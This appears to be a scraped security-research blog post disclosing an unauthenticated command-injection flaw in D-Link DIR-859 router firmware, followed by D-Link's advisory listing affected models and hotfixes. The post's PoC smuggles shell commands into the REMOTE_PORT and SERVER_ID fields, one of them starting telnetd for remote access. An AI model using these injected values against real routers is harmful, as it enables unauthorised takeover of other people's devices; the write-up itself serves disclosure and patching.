=== Content from medium.com_d2da72c3_20250121_003039.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F6bca043500ae&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-rce-unauthenticated-cve-2019-20216-cve-2019-20217-en-6bca043500ae&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-rce-unauthenticated-cve-2019-20216-cve-2019-20217-en-6bca043500ae&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# D-Link DIR-859 ‚Äî RCE Unauthenticated (CVE-2019‚Äì20216 ‚Äî CVE-2019‚Äì20217)

[![Miguel M√©ndez Z.](https://miro.medium.com/v2/resize:fill:88:88/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---byline--6bca043500ae--------------------------------)

[Miguel M√©ndez Z.](/%40s1kr10s?source=post_page---byline--6bca043500ae--------------------------------)

¬∑

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s1kr10s%2Fd-link-dir-859-rce-unauthenticated-cve-2019-20216-cve-2019-20217-en-6bca043500ae&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--byline--6bca043500ae---------------------post_header-----------)

3 min read¬∑Jan 28, 2020

--

Listen

Share

# Researchers

* Miguel Mendez Z. ‚Äî (s1kr10s)
* Pablo Pollanco ‚Äî (secenv)

# Technical Details

* Model : DIR-859
* Firmware Version: 1.06b01 Beta01, 1.05
* Architecture: MIPS 32 bit

# Vulnerability

The remote code execution vulnerability was found in the ssdpcgi() function, which the vendor had already created a patch to repair the vulnerability. At that time the attack vector was HTTP\_ST. Next we will give a description about the new finding.

To start we rewrite (pseudocode) the main function, for a better understanding.

```
int ssdpcgi_main(int argc) {
  char *HTTP_ST;
  char *REMOTE_ADDR;
  char *REMOTE_PORT;
  char *SERVER_ID;

  if (argc == 2) {
    HTTP_ST = getenv("HTTP_ST");
    REMOTE_ADDR = getenv("REMOTE_ADDR");
    REMOTE_PORT = getenv("REMOTE_PORT");
    SERVER_ID = getenv("SERVER_ID");
    if ("SI LAS VARIABLE SON" == 0) {
        break;
    } else {
        // PATCH "strncmp()" THIS FILTERS THE CODE INJECTION
        all = strncmp(HTTP_ST,"ssdp:all",8);
        if (all == 0) {
            format = "%s ssdpall %s:%s %s &";
        } else {
            uuid = strncmp(HTTP_ST,"uuid:",5);
            if (uuid == 0) {
                format = "%s uuid %s:%s %s %s &";
            } else {
                // MORE VALIDATIONS
                ...
                ...
                ...lxmldbc_system(format,"/etc/scripts/upnp/M-SEARCH.sh",REMOTE_ADDR,REMOTE_PORT);
    }
}
```

After analyzing this function we see that the variables REMOTE\_PORT and SERVER\_ID are passed as arguments to lxmldbc\_system(). The problem is that the values of these variables can be controlled by the user. You can see code from the libxmldbc library [here](https://pastebin.com/kqEByBgA).

```
/* call system() in printf() format. */
int lxmldbc_system(const char * format, ‚Ä¶){
   char cmd[MAX_CMD_LEN];
   va_list marker;
   va_start(marker, format);vsnprintf(cmd, sizeof(cmd), format, marker);
va_end(marker);
return
system(cmd);
}
```
![]()![]()

As we can see, these variables are not filtering correctly, so we can control these values or concatenate other values to existing ones, such as; REMOTE\_PORT=13**;ls** and SERVER\_ID=1**;ls**, then these values are stored in a buffer using vsnprintf(), to format the final command.

After returning, the formatted command is stored in a buffer pointed to by the record s0=buffer, which will be an argument for the system (s0) function. The dump (memory) is also shown as is the structure.

Memory value of REMOTE\_PORT.

**Reg s0:** /etc/scripts/upnp/M-SEARCH.sh ssdpall 127.0.0.1:13; üíâ 1 &

![]()

REMOTE\_PORT

Memory value of SERVER\_ID.

**Reg s0:** /etc/scripts/upnp/M-SEARCH.sh ssdpall 127.0.0.1:13 1; üíâ &

![]()

SERVER\_ID

# Exploit PoC

Before proceeding with debugging, we adjust the value of each variable, and include the injection of the command. At the end of the execution we see that the injected commands were executed successfully.

```
IP="127.0.0.1"
PORT="1337"
METHOD=‚ÄùM-SEARCH"
URI="/"
REMOTE_PORT="13;ls;"
SERVER_ID="1;telnetd"
```

REMOTE\_PORT

**Reg s0:**/etc/scripts/upnp/M-SEARCH.sh ssdpall 127.0.0.1:13;**ls**; 1&

SERVER\_ID

**Reg s0:**/etc/scripts/upnp/M-SEARCH.sh ssdpall 127.0.0.1:13 1;**telnetd** &

![]()

Execution

**Link to the advisory**: <https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147>

By3‚Ä¶ üëæ

[Hacking](/tag/hacking?source=post_page-----6bca043500ae--------------------------------)[Exploit](/tag/exploit?source=post_page-----6bca043500ae--------------------------------)[Reversing](/tag/reversing?source=post_page-----6bca043500ae--------------------------------)

--

--

[![Miguel M√©ndez Z.](https://miro.medium.com/v2/resize:fill:96:96/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--6bca043500ae--------------------------------)[![Miguel M√©ndez Z.](https://miro.medium.com/v2/resize:fill:128:128/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](/%40s1kr10s?source=post_page---post_author_info--6bca043500ae--------------------------------)Follow[## Written by Miguel M√©ndez Z.](/%40s1kr10s?source=post_page---post_author_info--6bca043500ae--------------------------------)[142 Followers](/%40s1kr10s/followers?source=post_page---post_author_info--6bca043500ae--------------------------------)¬∑[45 Following](/%40s1kr10s/following?source=post_page---post_author_info--6bca043500ae--------------------------------)

<https://s1kr10s.github.io/whoami.html> ‚Äî @s1kr10s

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----6bca043500ae--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----6bca043500ae--------------------------------)[About](/about?autoplay=1&source=post_page-----6bca043500ae--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----6bca043500ae--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----6bca043500ae--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----6bca043500ae--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----6bca043500ae--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----6bca043500ae--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----6bca043500ae--------------------------------)[Teams](/business?source=post_page-----6bca043500ae--------------------------------)



=== Content from supportannouncement.us.dlink.com_5f8b64ac_20250121_003041.html ===


Search by product, keyword, model.

* [Home](http://us.dlink.com/)
  [Support](http://support.dlink.com/index.aspx)
  [Forums](http://forums.dlink.com)
  [Security Advisories](http://support.dlink.com/securityadvisories.aspx)
  [Shop](https://shop.us.dlink.com/)
  US
  ![](https://supportannouncement.us.dlink.com/images/US.gif)
  English
  []

  ¬†¬†¬†¬†English¬†|¬†French

Support Announcement

Announcement
>
SAP10147

DIR-818Lx Rev Bx / DIR-822 Rev Bx & Cx /DIR-823 Rev Ax / DIR-859 Rev Ax / DIR-865L Rev Ax / DIR-868L Rev Ax & Bx / DIR-869 Rev Ax / DIR-880L Rev Ax / DIR-885L Rev Ax / DIR-890L Rev Ax / DIR-895L Rev Ax :: CVE-2019-17621 :: Unauthenticated remote command execution (RCE) :: CVE-2019-20213 :: Information Disclosure :: CVE-2019-20215/20216/20217 :: RCE via UPnP ssdpcfgi() LAN-side vulnerabilities

 **Overview**

This announcement is an extension of a third-party report involving the DIR-859 Rev. Ax. D-Link confirmed and released patches j([HERE](http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10146)) for this report, and it has public disclosure as CVE-2019-17621 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-17621)) and CVE-2019-20213 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20213)).

On November 5, 2019, the same third party reported their original report and related public disclosure of CVE-2019-20215 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)), CVE-2019-20216 ([HERE)](https://nvd.nist.gov/vuln/detail/CVE-2019-20216), and CVE-2019-20217 ([HERE](https://nvd.nist.gov/vuln/detail/CVE-2019-20217)) may also involve other devices which D-Link also discovered and confirmed through its security process:

* DIR-818Lx Bx firmware v2.05b03\_Beta08
* DIR-822 Cx firmware v3.12b04
* DIR-822 Bx firmware v2.03b01
* DIR-823 Ax firmware v1.00b06\_Beta
* DIR-859 Ax firmware v1.06b01\_Beta01
* DIR-865L Ax firmware v1.07.b01
* DIR-868L Ax firmware v1.12b04
* DIR-868L Bx firmware v2.05b02
* DIR-869 Ax firmware v1.03b02\_Beta02
* DIR-880L Ax firmware v1.08b04
* DIR-890L Ax firmware v1.11b01\_Beta01
* DIR-885L Ax firmware v1.12b05
* DIR-895L Ax firmware v1.12b10

The original security vulnerability, filed under CVE-2019-17621 and CVE-2019-20213, the DIR-859 Rev. Ax device firmware may allow a malicious user an unauthenticated, remote command execution on the device's LAN-Side (in-home) connections. Additional related research filed under CVE-2019-20215, CVE-2019-20216, and CVE-2019-20217 reported unauthenticated command execution in the device firmware via the device's ssdpcgi() CGI interpreter.

Many of the models listed in this security-related reports have reached their End of Support (‚ÄúEOS‚Äù) / End of Life (‚ÄúEOL‚Äù) Life-cycle dates. As a general policy, when the product reaches EOS/EOL, it can no longer be supported, and all firmware development for the product ceases, except in certain unique situations. In these EOS/EOL exceptional cases, D-Link was able to provide a Firmware Beta Patch Release after the EOS/EOL Date.¬†**Please see the information and recommendations**below.

D-Link takes the issues of network security and user privacy very seriously. We have a dedicated task force and product management team on call to address evolving security issues and implement appropriate security measures.

 **Third-Party Report**

¬†¬†¬†¬† Miguel Mendez Z. ‚Äî (s1kr10s) - Research Center at Telef√≥nica Chile

¬†¬†¬†¬† Pablo Pollanco ‚Äî (secenv)¬† - Research Center at Telef√≥nica Chile

**CVE-ID Public Disclosure**

* [CVE-2019-17621](https://nvd.nist.gov/vuln/detail/CVE-2019-17621)¬† UPnP¬† /gena.cgi in the D-Link DIR-859 firmware v1.05 &v1.06B01 Beta01 allows an unauthenticated command execution
* [CVE-2019-20213](https://nvd.nist.gov/vuln/detail/CVE-2019-20213)¬† D-Link DIR-859 firmware v1.07b03\_beta allows unauthenticated information disclosure
* [C](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)[VE-2019-20215](https://nvd.nist.gov/vuln/detail/CVE-2019-20215)¬† D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution
* [CVE-2019-20216](https://nvd.nist.gov/vuln/detail/CVE-2019-20216)¬† D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution
* [CVE-2019-20217](https://nvd.nist.gov/vuln/detail/CVE-2019-20217)¬† D-Link DIR-859 firmware v1.05 & v1.06B01 Beta01 devices allow unauthenticate command execution

**Affected Products**

There is a mix of End-Of-Service Life products and active Life-Cycle products regarding this security issue. Please see below for End-of-Service Life products.

For active products to close this, you can download the patch and upgrade it through the device's web-configuration GUI.

| Model | HW Rev. | Region | Affected FW | Fixed FW | Recommendation | Info Last Update | **EoS/EoL Info** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| DIR-818Lx | All Bx Revisions | US | v2.05b03\_Beta08 & older | [v2.06b02 Hotfix](http://legacyfiles.us.dlink.com/DIR-818LW/REVB/DIR-818LW_REVB_FIRMWARE_v2.06B02_HOTFIX.zip) | Please download & upgrade | 01/20/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=7de8b67be2cb493f91d70f12f7ce43c9) |
| DIR-822 | All Bx Revisions | Non-US | v2.03b01 & older | v2.04b02beta01 Hotfix | Please download & upgrade | 01/22/2020 | Not Applicable |
| DIR-822 | All Cx Revisions | US | v3.12b04 & older | v3.15b03 Hotfix | Please download & upgrade | 11/22/2019 | None/Active SKU |
| DIR-823 | All Ax Revisions | Non-US | v1.00b06\_Beta & older | v1.03b03betab01 Hotifx | Please download & upgrade | 12/27/2019 | Not Applicable |
| DIR-859 | All Ax Revisions | US | v1.06b01Beta01 & older | [v1.07b03 beta Hotfix](http://legacyfiles.us.dlink.com/DIR-859/REVA/FIRMWARE/DIR-859_REVA_FIRMWARE_1.07B03_HOTFIX.zip) | Please download & upgrade | 11/23/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=a64612142a3041d98642960e5f840fb6) |
| DIR-865L | All Ax Revisions | US | v1.07b01 & older | EOL / Not Supported | Please See Below | 11/23/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=5de2fe63340d4a258ce7d873b3459707) |
| DIR-868L | All Ax Revisions | US | v1.12b04 & older | [v1.20b07 Hotfix](http://legacyfiles.us.dlink.com/DIR-868L/REVA/FIRMWARE/DIR-868L_REVA_FIRMWARE_1.20B07_HOTFIX.zip) | Please download & upgrade | 12/06/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=20c2a92f049347979d556b47b4056a6b) |
| DIR-868L | All Bx Revisions | Non-US | v2.05b02 & older | [v2.20b02beta01 Hotfix](http://legacyfiles.us.dlink.com/DIR-868L/REVB/FIRMWARE/DIR-868L_REVB_FIRMWARE_v2.20B02_BETA01_HOTFIX.zip) | Please download & upgrade | 12/18/2019 | Not Applicable |
| DIR-869 | All Ax Revisions | US | v1.03b02Beta02 & older | v1.04b03beta01 Hotfix | Please download & upgrade | 12/23/2019 | None/Active SKU |
| DIR-880L | All Ax Revisions | US | v1.08b04 & older | [v1.20b03beta01 Hotfix](http://legacyfiles.us.dlink.com/DIR-880L/REVA/FIRMWARE/DIR-880L_REVA_FIRMWARE_1.20B03_BETA01_HOTFIX.zip) | Please download & upgrade | 01/06/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=52f29b2b2bf245d199176469a277b8e1) |
| DIR-890L/R | All Ax Revisions | US | v1.11b01\_Beta01 & older | [v1.21b04\_Hotfix](http://legacyfiles.us.dlink.com/DIR-890L/REVA/FIRMWARE/DIR-890L_REVA_FIRMWARE_1.21B04_HOTFIX.zip) | Please download & upgrade | 01/13/2020 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=d4b79b4434754f769d12ef58aab4d8e7) |
| DIR-885L/R | All Ax Revisions | US | v1.12b05 & older | [v1.21b03\_Hotfix](http://legacyfiles.us.dlink.com/DIR-885L/REVA/FIRMWARE/DIR-885L_REVA_FIRMWARE_1.21B03_HOTFIX.zip) | Please download & upgrade | 12/09/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=917816fe412e4ef2ada6113374a795b0) |
| DIR-895L/R | All Ax Revisions | US | v1.12b10 & older | [v1.21b05\_Hotfx](http://legacyfiles.us.dlink.com/DIR-895L/REVA/FIRMWARE/DIR-895L_REVA_FIRMWARE_v1.21B05_HOTFIX.zip) | Please download & upgrade | 12/16/2019 | [Legacy](https://legacy.us.dlink.com/pages/product.aspx?id=44d530b08c9d4cc58259bab295edc2ec) |

**Note:** Some routers must be updated twice to close this security issue. If you download the fixed firmware, and there are two firmware .BIN files in the ZIP-file, then the two-step update is required. First, update the device from the Device Web-GUI using {Model-Device-Firmware} \_**middle\_STEP\_01.bin**. Second, update the device from **the** device from the Web-GUI using {Model-Devic**e-Firmware\_STEP\_02**}.bin.

**Recommendation for End of Support Life Products**

From time to time, D-Link will decide that some of its products have reached End of Support ("EOS") / End of Life ("EOL"). D-Link may choose to EOS/EOL an effect due to the evolution of technology, market demands, innovations, product efficiencies based on new technologies, or the product matures over time and should be replaced by functionally superior technology.

**For US Consumer**

If a product has reached End of Support ("EOS") / End of Life ("EOL"), there is usually no further extended support or development for it. Once a product reaches its EOL/EOS date, all files post regarding the devices are moved to¬†¬†<https://legacy.us.dlink.com/>¬†as the final information archive for the device..

Typically for these products, D-Link will not resolve device or firmware issues since all development and customer support have ceased.

* [Contact Us](http://support.dlink.com/Search.aspx)
* Do Not Sell My Info ‚Äì CA Residents Only
* Privacy
* Terms of Use
* End of Product Life-Cycle
* [GPL Source Code](http://tsd.dlink.com.tw/gpl2008.asp)


